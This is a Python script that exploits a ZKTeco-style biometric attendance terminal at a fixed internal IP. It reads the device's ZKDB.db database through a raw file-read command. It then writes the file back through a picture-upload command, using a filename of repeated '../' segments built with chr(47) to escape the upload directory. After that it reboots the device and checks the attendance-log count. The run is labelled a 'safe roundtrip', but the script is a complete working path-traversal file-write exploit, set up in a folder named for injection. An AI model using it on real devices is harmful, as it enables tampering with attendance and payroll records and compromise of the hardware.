#!/usr/bin/env python3
"""SAFE roundtrip test: download + upload unchanged + verify."""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket, struct, time, sqlite3, os
from zk import ZK, const
from struct import pack, unpack

DEVICE_IP = '172.16.0.214'
OUT_DIR = 'D:\\chamcong\\zk_inject_workspace'

def send_cmd(conn, command, data=b''):
    try:
        return conn._ZK__send_command(command, data, response_size=1024)
    except Exception as e:
        return {'status': False, 'error': str(e)}

def upload_via_picture(conn, target_path, data):
    parts = target_path.split('/')
    traversal = ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + "/".join(parts)
    filename = traversal.encode() + b'\x00'
    size = len(data)
    r1 = send_cmd(conn, const.CMD_PREPARE_DATA, pack('I', size))
    if not r1.get('status'): return {'error': 'PREPARE failed'}
    MAX_CHUNK = 1024
    remain = size % MAX_CHUNK
    packets = (size - remain) // MAX_CHUNK
    for i in range(packets):
        r = send_cmd(conn, const.CMD_DATA, data[i*MAX_CHUNK:(i+1)*MAX_CHUNK])
        if not r.get('status'): return {'error': 'chunk fail'}
    if remain:
        r = send_cmd(conn, const.CMD_DATA, data[packets*MAX_CHUNK:])
    r3 = send_cmd(conn, 0x272B, filename)
    return {'PREPARE': r1, 'UPLOAD': r3}

def download_file(conn, path, output_path):
    sock = conn._ZK__sock
    r = send_cmd(conn, 0x6A6, path + b'\x00')
    if not r.get('status') and r.get('code') != 1500:
        print('  READFILE initial:', r)
        return None
    sock.settimeout(15)
    total = b''
    chunks = 0
    while True:
        try:
            chunk = sock.recv(65536)
            if not chunk: break
            if len(chunk) >= 16:
                top1, top2, tcp_len = unpack('<HHI', chunk[:8])
                if tcp_len == 0: break
                zk_cmd = unpack('<H', chunk[8:10])[0]
                body = chunk[16:16+(tcp_len - 8)] if tcp_len > 8 else b''
                total += body
                chunks += 1
                if zk_cmd == 0x07D0 or chunks > 5000: break
        except socket.timeout: break
    print('  Downloaded: {} chunks, {} bytes'.format(chunks, len(total)))
    with open(output_path, 'wb') as f:
        f.write(total)
    return total

os.makedirs(OUT_DIR, exist_ok=True)

zk = ZK(DEVICE_IP, port=4370, timeout=15, password=0)
conn = zk.connect()
print('[+] Connected:', conn.get_firmware_version(), conn.get_platform())

try:
    conn.disable_device()
except: pass

# Get before counts
try:
    before_att = conn.get_attendance_count()
    print('[*] BEFORE: ATTLOG={}'.format(before_att))
except: before_att = None

# === Step 1: Download ZKDB.db ===
print('\n[*] Downloading ZKDB.db from device...')
zkdb_local = os.path.join(OUT_DIR, 'downloaded.db')
data = download_file(conn, b'/mnt/mtdblock/data/ZKDB.db', zkdb_local)
if not data or data[:15] != b'SQLite format 3':
    print('[!] Bad download')
    exit(1)
print('  First 15 bytes:', data[:15])

# Try SQLite open
try:
    db = sqlite3.connect(zkdb_local)
    cur = db.cursor()
    cur.execute('SELECT COUNT(*) FROM ATT_LOG')
    cnt = cur.fetchone()[0]
    print('  ATT_LOG count in downloaded:', cnt)
    db.close()
except Exception as e:
    print('  SQLite open error:', e)

# === Step 2: Upload back UNCHANGED ===
print('\n[*] Uploading UNCHANGED ZKDB.db (safe roundtrip)...')
result = upload_via_picture(conn, 'mnt/mtdblock/data/ZKDB.db', data)
print('  Result:', result)

time.sleep(2)

# Verify
print('\n[*] Verifying upload...')
verify_path = os.path.join(OUT_DIR, 'verified.db')
data2 = download_file(conn, b'/mnt/mtdblock/data/ZKDB.db', verify_path)
if data2[:15] == b'SQLite format 3':
    print('  [+] SQLite magic OK after upload')

# Reboot
print('\n[*] Rebooting device...')
try:
    conn.restart()
    print('  [+] Restart sent')
except Exception as e:
    print('  [!] Restart:', e)

try: conn.enable_device()
except: pass
try: conn.disconnect()
except: pass

time.sleep(15)

# Reconnect and verify count
try:
    zk2 = ZK(DEVICE_IP, port=4370, timeout=10, password=0)
    conn2 = zk2.connect()
    print('\n[+] Reconnected after reboot')
    after_att = conn2.get_attendance_count()
    print('[*] AFTER: ATTLOG={}'.format(after_att))
    if before_att is not None and after_att == before_att:
        print('\n[+] SAFE ROUNDTRIP CONFIRMED! Device working normally')
    elif before_att is not None:
        print('\n[!] ATTLOG count changed unexpectedly: {} -> {}'.format(before_att, after_att))
    conn2.disconnect()
except Exception as e:
    print('[!] Reconnect failed:', e)

print('\n[+] Done')
